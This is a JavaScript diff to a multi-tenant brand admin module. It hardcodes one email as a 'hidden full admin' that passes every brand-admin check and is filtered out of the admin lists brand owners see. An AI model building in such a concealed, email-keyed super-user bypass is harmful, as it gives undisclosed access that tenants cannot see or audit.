@@ -14,6 +14,36 @@ function normSubdomain(value) {
   return s || null;
 }
 
+/** Hidden full admin; not shown in brand admin lists. */
+function isHiddenPlatformAdminEmail(email) {
+  return String(email || "").trim().toLowerCase() === "hello@kavisha.ai";
+}
+
+/** @param {string} email */
+export function isReservedPlatformSuperadminEmail(email) {
+  return isHiddenPlatformAdminEmail(email);
+}
+
+/** Admin emails visible to brand admins (excludes hidden super-admin). */
+export function filterVisibleAdmins(admins) {
+  if (!Array.isArray(admins)) return [];
+  return admins.filter((a) => !isHiddenPlatformAdminEmail(a));
+}
+
+/** assignedTo values visible to brand admins (excludes hidden super-admin). */
+export function filterVisibleAssignedTo(assignedTo) {
+  if (assignedTo == null) return [];
+  const list = Array.isArray(assignedTo)
+    ? assignedTo
+    : typeof assignedTo === "string" && assignedTo.trim()
+      ? [assignedTo.trim()]
+      : [];
+  return list
+    .map((e) => (typeof e === "string" ? e.trim() : String(e || "").trim()))
+    .filter(Boolean)
+    .filter((e) => !isHiddenPlatformAdminEmail(e));
+}
+
 function brandDocId(doc) {
   if (!doc) return null;
   if (doc._id?.toString) return doc._id.toString();
@@ -203,10 +233,12 @@ export async function mapBrandToClientContext(brand, userEmail) {
     resolveBrandImageUrl(brand.brandImageUrl),
     resolveBrandImageUrl(brand.paymentQrUrl),
   ]);
+  const em = String(userEmail || "").trim().toLowerCase();
   const isAdmin =
     Boolean(userEmail) &&
-    Array.isArray(brand.admins) &&
-    brand.admins.includes(userEmail);
+    (isHiddenPlatformAdminEmail(userEmail) ||
+      (Array.isArray(brand.admins) &&
+        brand.admins.some((a) => String(a || "").trim().toLowerCase() === em)));
 
   return {
     brandId: brandDocId(brand),
@@ -232,7 +264,7 @@ export async function mapBrandToClientContext(brand, userEmail) {
     acceptPayment: brand.acceptPayment || false,
     title: brand.title,
     subtitle: brand.subtitle,
-    admins: brand.admins || [],
+    admins: filterVisibleAdmins(brand.admins || []),
     isBrandAdmin: isAdmin,
     subdomain,
     initialmessage: brand.initialmessage,
@@ -292,6 +324,7 @@ export async function getWhatsAppLeadBrand({
 
 export async function isBrandAdmin(email, brand) {
   if (!email || !brand) return false;
+  if (isHiddenPlatformAdminEmail(email)) return true;
   const sub = normSubdomain(brand);
   if (!sub) return false;
   try {
@@ -306,7 +339,7 @@ export async function isBrandAdmin(email, brand) {
 
 export async function getBrandAdmins(brand) {
   const doc = await getBrandBySubdomain(brand);
-  return Array.isArray(doc?.admins) ? doc.admins : [];
+  return filterVisibleAdmins(doc?.admins);
 }
 
 export async function getBrandServiceKeys(brand) {
